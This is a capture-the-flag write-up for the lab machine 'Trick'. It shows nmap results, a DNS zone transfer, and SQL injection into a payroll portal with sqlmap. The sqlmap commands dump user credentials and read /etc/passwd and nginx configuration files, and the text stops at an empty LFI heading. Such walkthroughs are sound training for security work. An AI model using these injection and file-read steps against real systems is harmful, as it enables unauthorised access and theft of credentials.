# Nmap 
```bash
22 - OpenSSH 7.9p1 Debian 10+deb10u2
25 - Postfix
53 - BIND "9.11.5-P4-5.1+deb10u7-Debian"
80 - nginx 1.14.2 - unconfigured boostrap
```

## DNS Enum
```bash
nslookup
> SERVER 10.10.11.166
Default server: 10.10.11.166
Address: 10.10.11.166#53
> 10.10.11.166
166.11.10.10.in-addr.arpa       name = trick.htb.
>
```
```bash
dig axfr @10.10.11.166 trick.htb

; <<>> DiG 9.18.1-1-Debian <<>> axfr @10.10.11.166 trick.htb
; (1 server found)
;; global options: +cmd
trick.htb.              604800  IN      SOA     trick.htb. root.trick.htb. 5 604800 86400 2419200 604800
trick.htb.              604800  IN      NS      trick.htb.
trick.htb.              604800  IN      A       127.0.0.1
trick.htb.              604800  IN      AAAA    ::1
preprod-payroll.trick.htb. 604800 IN    CNAME   trick.htb.
trick.htb.              604800  IN      SOA     trick.htb. root.trick.htb. 5 604800 86400 2419200 604800
;; Query time: 32 msec
;; SERVER: 10.10.11.166#53(10.10.11.166) (TCP)
 WHEN: Mon Jul 04 23:11:04 IST 2022
;; XFR size: 6 records (messages 1, bytes 231)
```

## SQLi
[http://preprod-payroll.trick.htb](http://preprod-payroll.trick.htb)  
  
The preprod portal has a login page, which is vulnerable to SQli  
  
![sqli](./sqli.png)

We now have access to the payroll portal, it might be worth testing the site for more SQLi vulns  
After trying sqlmap on various forms, the 'save deduction' form seems to be vulnerable  
  
![deductions](./deductions.png)

```bash
sqlmap -r save_deductions.req --batch --threads 10 -D payroll_db -T users --dump
```
```bash
Database: payroll_db
Table: users
[1 entry]
+----+-----------+----------------+------+---------+---------+-----------------------+------------+
| id | doctor_id | name           | type | address | contact | password              | username   |
---+-----------+----------------+------+---------+---------+-----------------------+------------+
| 1  | 0         | Administrateur | 1    | <blank> | <blank> | SuperGucciRainbowCake | Enemigosss |
+----+-----------+----------------+------+---------+---------+-----------------------+------------+
```bash

The SQli can also be leveraged to dump files that www-data has access to:  
```bash
sqlmap -r save_deductions.req --batch --threads 10 --file-read /etc/passwd
```
```bash
grep sh$ /home/blnkn/.local/share/sqlmap/output/preprod-payroll.trick.htb/files/_etc_passwd
root:x:0:0:root:/root:/bin/bash
michael:x:1001:1001::/home/michael:/bin/bash
```

looking at the nginx virtual host config to know what the web folder names are  
```bash
sqlmap -r save_deductions.req --batch --threads 10 --file-read /etc/nginx/sites-available/default  
```
```bash
grep 'server_name\|root' /home/blnkn/.local/share/sqlmap/output/preprod-payroll.trick.htb/files/_etc_nginx_sites-available_default                       
        server_name trick.htb;
        root /var/www/html;
        server_name _;
        server_name preprod-marketing.trick.htb;
        root /var/www/market;
        server_name preprod-payroll.trick.htb;
        root /var/www/payroll;
```
this uncovers a new vhost - preprod-marketing  
[http://preprod-marketing.trick.htb/index.php](http://preprod-marketing.trick.htb/index.php)  
because we now have the web folder paths we can now dump the source code  


# LFI
